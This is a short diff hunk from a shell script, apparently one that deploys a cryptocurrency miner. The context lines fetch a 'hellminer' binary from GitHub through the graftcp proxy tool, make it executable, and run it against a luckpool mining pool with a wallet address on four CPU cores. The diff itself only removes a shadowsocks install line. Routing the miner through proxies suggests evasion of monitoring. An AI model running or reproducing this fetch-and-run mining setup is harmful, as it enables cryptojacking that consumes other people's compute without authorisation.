@@ -35,8 +35,5 @@ echo " "
 ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/hellminer
 chmod +x hellminer
 
-apt -y install shadowsocks-libev rng-tools
-
-
 ./graftcp/graftcp ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bigbang -p x --cpu 4
 sleep 2
